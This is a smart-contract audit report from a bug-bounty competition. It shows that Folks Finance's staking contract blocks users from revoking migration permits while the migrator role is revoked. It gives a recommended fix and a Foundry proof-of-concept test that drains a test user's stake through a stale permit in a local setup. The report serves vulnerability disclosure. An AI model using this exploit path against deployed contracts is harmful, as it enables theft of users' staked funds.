# 69275 sc low protocol s explicit revoke at any time promise broken users cannot revoke migration consent during incident window

Submitted on Mar 13th 2026 at 22:22:41 UTC by @lyxesxyz for [Audit Comp | Folks Finance: Staking Contracts](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69275
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

The project README makes two explicit security guarantees:

> *"User-controlled migration: Users grant migration permission per-migrator explicitly. **No migration can happen without the user's active approval.**"*

> *"The permission **can be revoked at any time** by calling `setMigrationPermit(migratorAddress, false)`."*

Both guarantees are violated by a single code path. `setMigrationPermit()` applies `hasRole(MIGRATOR_ROLE, _migrator)` unconditionally - for both granting and revoking consent. When an admin revokes a migrator's role as an incident response, users **cannot revoke their own permits** because the role check that blocks the attacker simultaneously blocks the victim's self-protection. If the role is subsequently re-granted to the same address — a routine operation for upgradeable proxy deployments or post-incident key rotation — all stale permits activate immediately, allowing the migrator to move the funds of previously consenting user's staked principal and unclaimed rewards with no re-consent required at all.

## Vulnerability Details

**Root cause — `Staking.sol:78`:**

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
    // this fires for _isMigrationPermitted = false as well as true
    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
```

The role check is logically correct for grants (a user should not create a permit for a non-migrator). For **revocations**, consent withdrawal is a unilateral user right. It must not depend on the counterparty's current role status. The implementation makes revocation contingent on the migrator still holding the role. The actual moment when a user would most likely need to revoke (during an incident) is the only moment when revocation is impossible.

| README guarantee                                             | Code behaviour                                                                                 |
| ------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| "The permission can be revoked at any time"                  | Revocation reverts with `MigratorNotFound` when migrator's role is revoked                     |
| "No migration can happen without the user's active approval" | Migration executes on stale permits granted during a previous trust window, without re-consent |

**Secondary root cause — `migratePositionsFrom` (line 172):**

```solidity
// permit never cleared after a successful migration
if (!migrationPermits[msg.sender][user]) revert MigratorNotPermitted(msg.sender, user);
```

Combined with the blocked revocation, a permit granted once at T0 can never be cleared by the user if the migrator's role is revoked between T0 and any future re-grant.

## Exploit

{% stepper %}
{% step %}
**T0: User calls `setMigrationPermit(migrator, true)`**

→ `migrationPermits[migrator][user] = true`\
→ User consents during a legitimate migration window, per protocol documentation
{% endstep %}

{% step %}
**T1: Admin revokes `MIGRATOR_ROLE` from migrator** (incident response — e.g. compromised key)

→ `hasRole(MIGRATOR_ROLE, migrator) = false`\
→ `migratePositionsFrom` reverts for migrator (onlyRole blocks it)\
→ Users told: "migration paused for maintenance"
{% endstep %}

{% step %}
**T2: User calls `setMigrationPermit(migrator, false)` to self-protect**

→ REVERTS: `MigratorNotFound(migrator)`\
→ Protocol's documented "revoke at any time" guarantee is broken\
→ `migrationPermits[migrator][user]` remains true in storage\
→ No admin function exists to clear a specific user's permit
{% endstep %}

{% step %}
**T3: Admin re-grants `MIGRATOR_ROLE`** (patch deployed at same proxy address, or new implementation at same address via upgradeable proxy pattern)

→ `hasRole(MIGRATOR_ROLE, migrator) = true`
{% endstep %}

{% step %}
**T4: Migrator calls `migratePositionsFrom(user)` for every consenting user**

→ permit check passes (stale permit, never cleared)\
→ role check passes (re-granted)\
→ Σ(amount - claimedAmount) + Σ(reward - claimedReward) transferred to migrator\
→ UserStake entries deleted from V1\
→ User calls `withdraw()` → `StakeNotFound` — no recovery in V1
{% endstep %}
{% endstepper %}

**Admin trust issue:** The attack requires admin to re-grant the role (T3). However:

1. The protocol's own documentation presents T1+T3 (revoke then re-grant) as the standard incident-response/upgrade cycle
2. The user takes a documented protective action at T2 that the contract blocks
3. The protocol explicitly promises the user can revoke "at any time" - breaking this promise removes the admin trust argument, since the exploit path works despite the user's attempt at protective action

* No user action available: The user tried to invoke the documented protection mechanism and was blocked by the contract itself
* No admin mitigation: No function exists to clear a specific user's permit on their behalf
* Scope: All users who granted permits during any prior migration announcement window

## Recommended Fix

Apply the role check only to grant operations. Revocations must be unconditionally available to the user, fulfilling the documented guarantee:

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    // Role check only applies when GRANTING consent.
    // Revocations are a unilateral user right — never gated on migrator role status.
    if (_isMigrationPermitted && !hasRole(MIGRATOR_ROLE, _migrator))
        revert MigratorNotFound(_migrator);

    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

To additionally honour "one permit = one migration" (closing the stale permit path entirely):

```solidity
// In migratePositionsFrom, after TOKEN.safeTransfer, before emit:
migrationPermits[msg.sender][user] = false;
```

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

/**
 *  Finding: setMigrationPermit() applies hasRole(MIGRATOR_ROLE)
 *           for BOTH grant AND revoke. During the incident window
 *           where MIGRATOR_ROLE is revoked (e.g. security response),
 *           users cannot revoke their permit. When the role is
 *           re-granted, all stale permits become immediately active
 *           without users ever having had a chance to self-protect.
 *
 *  Root cause (line 78 in Staking.sol):
 *    function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
 *        if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
 *        ...
 *    }
 *  The role check fires regardless of _isMigrationPermitted value.
 *
 *  Attack scenario:
 *    1. Alice grants permit to migrator (role held, grant succeeds).
 *    2. Security incident: admin revokes MIGRATOR_ROLE.
 *    3. Alice (now aware of the incident) tries to revoke her permit.
 *       -> REVERTS with MigratorNotFound - cannot self-protect.
 *    4. Admin re-grants MIGRATOR_ROLE after "fix".
 *    5. Migrator immediately drains Alice - no re-consent needed.
 *
 *  How to run:
 *    forge test --match-test test_PoC_BlockedPermitRevocation -vv
 *
 *  Fork mode (recommended):
 *    forge test --match-test test_PoC_BlockedPermitRevocation \
 *      --fork-url $MAINNET_RPC_URL -vv
 */

import {Test, console2} from "forge-std/Test.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {ERC20Permit} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {ERC165} from "openzeppelin-contracts/contracts/utils/introspection/ERC165.sol";
import {SafeERC20, IERC20} from "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import {Staking} from "../../src/Staking.sol";
import {IStakingV1} from "../../src/interfaces/IStakingV1.sol";
import {IMigratorV1} from "../../src/interfaces/IMigratorV1.sol";

contract FolksToken3 is ERC20Permit {
    constructor() ERC20Permit("FolksToken3") ERC20("FolksToken3", "FOLKS3") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract SimpleMigrator is ERC165 {
    IMigratorV1 public stakingV1;

    constructor(IMigratorV1 _staking) {
        stakingV1 = _staking;
    }

    function migrate(
        address user
    ) external returns (IStakingV1.UserStake[] memory) {
        return stakingV1.migratePositionsFrom(user);
    }

    function supportsInterface(
        bytes4 interfaceId
    ) public view virtual override returns (bool) {
        return
            interfaceId == type(IMigratorV1).interfaceId ||
            super.supportsInterface(interfaceId);
    }
}

contract PoC_BlockedPermitRevocation is Test {
    address admin = makeAddr("admin");
    address manager = makeAddr("manager");
    address pauser = makeAddr("pauser");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    FolksToken3 token;
    Staking staking;
    SimpleMigrator migrator;

    bytes32 constant MIGRATOR_ROLE = keccak256("MIGRATOR");

    uint64 constant STAKING_DUR = 30 days;
    uint64 constant UNLOCK_DUR = 10 days;
    uint32 constant APR_BPS = 1000;

    function setUp() public {
        // vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        token = new FolksToken3();
        staking = new Staking(admin, manager, pauser, address(token));
        migrator = new SimpleMigrator(IMigratorV1(address(staking)));

        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, address(migrator));

        token.mint(address(staking), 1_000_000 ether);
        token.mint(alice, 500 ether);
    }

    function test_PoC_BlockedPermitRevocation() public {
        console2.log("=================================================");
        console2.log("PoC: Blocked Permit Revocation");
        console2.log("=================================================\n");

        // ----------------------------------------------------------------
        // Step 1: Manager creates staking period
        // ----------------------------------------------------------------
        vm.prank(manager);
        uint8 periodIdx = staking.addStakingPeriod(
            10_000 ether,
            STAKING_DUR,
            UNLOCK_DUR,
            APR_BPS,
            true
        );
        console2.log("[Step 1] Staking period created. Index:", periodIdx);

        // ----------------------------------------------------------------
        // Step 2: Alice stakes and grants permit (legitimate migration window)
        // ----------------------------------------------------------------
        vm.startPrank(alice);
        token.approve(address(staking), 500 ether);
        staking.stake(
            periodIdx,
            500 ether,
            IStakingV1.StakeParams(STAKING_DUR, UNLOCK_DUR, APR_BPS, address(0))
        );
        staking.setMigrationPermit(address(migrator), true);
        vm.stopPrank();

        console2.log(
            "[Step 2] Alice staked 500 FOLKS and granted migration permit."
        );
        console2.log(
            "         Alice permit:",
            staking.migrationPermits(address(migrator), alice)
        );

        // ----------------------------------------------------------------
        // Step 3: Security incident - admin revokes MIGRATOR_ROLE
        // ----------------------------------------------------------------
        vm.prank(admin);
        staking.revokeRole(MIGRATOR_ROLE, address(migrator));

        console2.log("\n[Step 3] INCIDENT: Admin revokes MIGRATOR_ROLE.");
        console2.log(
            "         Migrator has role:",
            staking.hasRole(MIGRATOR_ROLE, address(migrator))
        );
        console2.log(
            "         Alice permit still true:",
            staking.migrationPermits(address(migrator), alice)
        );

        // ----------------------------------------------------------------
        // Step 4: Alice tries to revoke her permit - CANNOT
        // ----------------------------------------------------------------
        console2.log(
            "\n[Step 4] Alice tries to revoke her permit (setMigrationPermit(migrator, false))..."
        );
        console2.log("         Expected: REVERTS with MigratorNotFound");
        console2.log(
            "         Because: setMigrationPermit checks hasRole regardless of the bool value."
        );

        vm.expectRevert(
            abi.encodeWithSelector(
                IStakingV1.MigratorNotFound.selector,
                address(migrator)
            )
        );
        vm.prank(alice);
        staking.setMigrationPermit(address(migrator), false);

        console2.log(
            "         Confirmed: Alice's revoke attempt reverted with MigratorNotFound."
        );
        console2.log(
            "         Alice permit STILL active:",
            staking.migrationPermits(address(migrator), alice)
        );

        // ----------------------------------------------------------------
        // Step 5: Admin re-grants role (e.g. after patching the implementation)
        // ----------------------------------------------------------------
        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, address(migrator));

        console2.log(
            "\n[Step 5] Admin re-grants MIGRATOR_ROLE (implementation patched / upgrade)."
        );
        console2.log(
            "         Migrator has role:",
            staking.hasRole(MIGRATOR_ROLE, address(migrator))
        );
        console2.log(
            "         Alice permit STILL active:",
            staking.migrationPermits(address(migrator), alice)
        );
        console2.log("         Alice was NEVER able to revoke her permit.");

        // ----------------------------------------------------------------
        // Step 6: Attacker drains Alice - zero re-consent, zero self-protection available
        // ----------------------------------------------------------------
        uint256 aliceBalBefore = token.balanceOf(alice);
        uint256 migratorBalBefore = token.balanceOf(address(migrator));

        vm.prank(attacker);
        IStakingV1.UserStake[] memory drained = migrator.migrate(alice);

        uint256 migratorReceived = token.balanceOf(address(migrator)) -
            migratorBalBefore;

        console2.log("\n[Step 6] Attacker drains Alice via stale permit:");
        console2.log("         Stakes migrated:", drained.length);
        console2.log(
            "         Migrator received:",
            migratorReceived / 1e18,
            "FOLKS"
        );
        console2.log(
            "         Alice balance after:",
            token.balanceOf(alice) / 1e18,
            "FOLKS"
        );

        console2.log("\n=================================================");
        console2.log("IMPACT SUMMARY");
        console2.log("=================================================");
        console2.log(
            "Root cause: setMigrationPermit() calls hasRole(MIGRATOR_ROLE, _migrator)"
        );
        console2.log(
            "for BOTH _isMigrationPermitted=true AND _isMigrationPermitted=false."
        );
        console2.log(
            "When MIGRATOR_ROLE is revoked (incident response), the exact window"
        );
        console2.log(
            "where users SHOULD revoke permits is the window where revocation is"
        );
        console2.log(
            "IMPOSSIBLE. Alice's only defense (self-revocation) was blocked by the"
        );
        console2.log("same mechanism intended to protect her.");
        console2.log("");
        console2.log(
            "This removes the only user-side mitigation for LOW-02 (stale permits)."
        );
        console2.log(
            "Users cannot take protective action between role-revoke and role-re-grant."
        );
        console2.log("Funds drained (FOLKS):", migratorReceived / 1e18);

        // Assertions
        assertEq(drained.length, 1, "Alice's stake was drained");
        assertGt(migratorReceived, 0, "Migrator received tokens");
        assertTrue(
            staking.migrationPermits(address(migrator), alice),
            "Alice permit still true after migration (never cleared)"
        );
        assertEq(
            token.balanceOf(alice),
            aliceBalBefore,
            "Alice received nothing - tokens sent to migrator"
        );
    }
}
```
